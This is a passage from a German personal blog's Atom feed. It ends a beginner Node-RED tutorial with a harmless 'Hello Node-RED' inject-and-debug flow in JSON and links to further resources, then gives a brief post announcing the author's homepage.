<p><a href="/images/posts/Node-RED/Node-RED_start6.png" class="image-popup">
    <img src="/images/posts/Node-RED/Node-RED_start6.png" alt="placeholder-2" />
</a></p>

<p>In den nun geöffneten Dialog kopieren wir folgendes:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"58c77306.a9bc6c"</span><span class="p">,</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"inject"</span><span class="p">,</span><span class="nl">"z"</span><span class="p">:</span><span class="s2">"f2cee3fc.2d2df8"</span><span class="p">,</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"topic"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
</span><span class="nl">"payload"</span><span class="p">:</span><span class="s2">"Hello Node-RED"</span><span class="p">,</span><span class="nl">"payloadType"</span><span class="p">:</span><span class="s2">"str"</span><span class="p">,</span><span class="nl">"repeat"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"crontab"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="w">
</span><span class="nl">"once"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"x"</span><span class="p">:</span><span class="mi">156</span><span class="p">,</span><span class="nl">"y"</span><span class="p">:</span><span class="mi">128</span><span class="p">,</span><span class="nl">"wires"</span><span class="p">:[[</span><span class="s2">"8b5d31de.8a8bb"</span><span class="p">]]},</span><span class="w">
</span><span class="p">{</span><span class="nl">"id"</span><span class="p">:</span><span class="s2">"8b5d31de.8a8bb"</span><span class="p">,</span><span class="nl">"type"</span><span class="p">:</span><span class="s2">"debug"</span><span class="p">,</span><span class="nl">"z"</span><span class="p">:</span><span class="s2">"f2cee3fc.2d2df8"</span><span class="p">,</span><span class="w">
</span><span class="nl">"name"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"active"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="nl">"console"</span><span class="p">:</span><span class="s2">"false"</span><span class="p">,</span><span class="nl">"complete"</span><span class="p">:</span><span class="s2">"false"</span><span class="p">,</span><span class="nl">"x"</span><span class="p">:</span><span class="mi">407</span><span class="p">,</span><span class="nl">"y"</span><span class="p">:</span><span class="mi">128</span><span class="p">,</span><span class="nl">"wires"</span><span class="p">:[]}]</span><span class="w">
</span></code></pre></div></div>

<p><a href="/images/posts/Node-RED/Node-RED_start7.png" class="image-popup">
    <img src="/images/posts/Node-RED/Node-RED_start7.png" alt="placeholder-2" />
</a></p>

<p><a href="/images/posts/Node-RED/Node-RED_start8.png" class="image-popup">
    <img src="/images/posts/Node-RED/Node-RED_start8.png" alt="placeholder-2" />
</a></p>

<p>Die nun importierten Elemente können nun frei am Flow Board platziert werden.</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">See you !</span><span class="dl">'</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="mehr-informationen">Mehr Informationen</h2>

<p>Hier findet ihr eine Menge Beispiele die ihr ganz einfach über die Importfunktion importiert könnt.<br />
<a href="http://flows.nodered.org/">Node-RED Library</a></p>

<p>Ein sehr guter Guide zum Einstieg in Node-RED<br />
<a href="http://noderedguide.com/">Node-RED Guide</a></p>

<p>NPM Package zum erstellen eines schnellen User interfaces (UI)<br />
<a href="https://www.npmjs.com/package/node-red-contrib-ui">Node-RED UI NPM Package</a></p>]]></content><author><name>Daniel Grill</name><email>info@dgrill.at</email><uri>https://dg60.github.io/</uri></author><summary type="html"><![CDATA[Eine kurze Einführung in Node-RED]]></summary></entry><entry xml:lang="DE"><title type="html">Homepage Ist Online</title><link href="https://dg60.github.io/Homepage-ist-Online/" rel="alternate" type="text/html" title="Homepage Ist Online" /><published>2016-08-04T00:00:00+02:00</published><updated>2016-08-04T00:00:00+02:00</updated><id>https://dg60.github.io/Homepage-ist-Online</id><content type="html" xml:base="https://dg60.github.io/Homepage-ist-Online/"><![CDATA[<p>Homepage ist online <a href="http://dgrill.at">www.dgrill.at</a>.
Mehr informationen findet ihr hier <a href="/portfolio/01-Homepage_de/">Work Section</a> !</p>]]></content><author><name>Daniel Grill</name><email>info@dgrill.at</email><uri>https://dg60.github.io/</uri></author><summary type="html"><![CDATA[]]></summary></entry></feed>